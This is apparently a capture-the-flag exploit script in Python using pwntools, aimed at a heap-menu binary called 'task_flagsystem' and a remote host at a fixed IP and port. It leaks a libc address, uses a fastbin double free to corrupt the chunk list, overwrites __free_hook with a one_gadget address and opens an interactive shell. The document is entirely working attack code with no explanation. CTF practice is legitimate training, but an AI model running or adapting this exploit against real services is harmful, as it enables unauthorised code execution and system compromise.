#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 2
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./task_flagsystem')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('139.9.103.173', 2333)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./task_flagsystem', checksec=False)
libc_one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]


def add(add_length, add_flag):
    p.sendafter("What's your choice: ", '1')
    p.sendafter("Please input the length of your team's flag:\n", str(add_length))
    p.sendafter("Please input the flag:\n", add_flag)


def delete(delete_idx):
    p.sendafter("What's your choice: ", '2')
    p.sendafter("Please input index of flag you want to delete:\n", str(delete_idx))


def edit(edit_idx, edit_flag):
    p.sendafter("What's your choice: ", '3')
    p.sendafter("Please input index of flag you want to edit:\n", str(edit_idx))
    p.sendafter("Now you can edit the flag:\n", edit_flag)


def show(show_idx):
    p.sendafter("What's your choice: ", '4')
    p.sendafter("Please input index of flag you want to display:\n", str(show_idx))
    p.recvuntil('The flag: ')


libc_one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
addr_chunk_list = 0x602088

add(0x80, 'a')  # 0
add(0x60, 'a')  # 1
delete(0)
add(0x60, '\n')  # 2
show(2)

addr___realloc_hook = u64(p.recv(6).ljust(8, '\x00')) - 2
libcbase = addr___realloc_hook - libc.sym['__realloc_hook']
addr___libc_realloc = libcbase + libc.sym['__libc_realloc']
addr__free_hook = libcbase + libc.sym['__free_hook']
addr_one_gadget = libcbase + libc_one_gadget[1]

add(0x7f, 'a')  # 3
delete(1)
delete(2)
delete(1)
add(0x60, p64(addr_chunk_list)) # 4
add(0x60, '/bin/sh\x00') # 5
add(0x60, p64(addr_chunk_list)) # 6
pd = p64(addr__free_hook)
add(0x60, pd) # 7
pd = p64(addr_one_gadget)
edit(3, pd)
delete(1)
success('addr___realloc_hook = ' + hex(addr___realloc_hook))
success('addr_one_gadget     = ' + hex(addr_one_gadget))
success('addr___malloc_hook = ' + hex(addr___realloc_hook + 8))
# gdb.attach(p)
p.interactive()

